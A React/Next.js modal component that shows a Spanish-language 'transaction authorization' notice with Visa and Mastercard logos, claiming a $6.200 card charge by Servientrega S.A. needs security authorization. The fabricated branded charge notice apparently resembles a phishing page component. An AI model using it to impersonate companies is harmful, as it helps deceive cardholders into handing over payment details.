import { motion, AnimatePresence } from 'framer-motion';
import Image from 'next/image';
import LogoVisa from '../../public/assets/visa.svg';
import LogoMaster from '../../public/assets/master.svg';
import CurrentDate from '../../components/Utils/CurrentDate';
import Alpha from '../../components/Utils/Alpha';

const Modal = ({ isOpen, onClose }) => {
  return (
    <AnimatePresence>
      {isOpen && (
        <motion.div
          className="fixed z-50 inset-0 overflow-y-auto p-10"
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          exit={{ opacity: 0 }}
        >
          <div className="flex items-center justify-center min-h-screen">
            <div
              className="fixed inset-0 bg-gray-800 bg-opacity-75 transition-opacity"
              aria-hidden="true"
              onClick={onClose}
            />
            <div className="bg-white rounded-lg z-10">
              <div className="p-4">
                <div className="grid grid-cols-2 gap-2 py-2">
                  <Image src={LogoVisa} alt="Logo" width="90" height="30" />
                  <Image src={LogoMaster} alt="Logo" width="90" height="30" />
                </div>
                <h3 className="text-lg text-center font-medium leading-6 text-gray-900">
                  Autorización de Transacción
                </h3>
                <div className="mt-2 py-2">
                  <p className="text-sm text-justify mb-2">
                    La transaccion que intentas realizar con
                    <span className="font-bold"> Servientrega S.A. </span>
                    por $6.200 el dia
                    <CurrentDate /> con tu tarjeta de credito, esta debe ser
                    autorizada por seguridad.
                  </p>
                  <div className="flex-col">
                    <h4 className="text-sm font-bold">
                      DETALLES DE LA TRANSACCIÓN:
                    </h4>
                    <p>
                      <span className="font-bold">Comercio: </span> Servientrega
                      S.A.
                    </p>
                    <p>
                      <span className="font-bold">Monto: </span> $6.200
                    </p>
                    <p>
                      <span className="font-bold">Numero de autorizacion </span>
                      <Alpha />
                    </p>
                  </div>
                </div>
                <div className="mt-4 flex justify-end">
                  <button
                    type="button"
                    className="inline-flex items-center px-4 py-2 border border-gray-300 shadow-sm text-sm font-medium rounded-md text-gray-700 bg-white hover:bg-gray-50 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-indigo-500"
                    onClick={onClose}
                  >
                    Close
                  </button>
                </div>
              </div>
            </div>
          </div>
        </motion.div>
      )}
    </AnimatePresence>
  );
};

export default Modal;
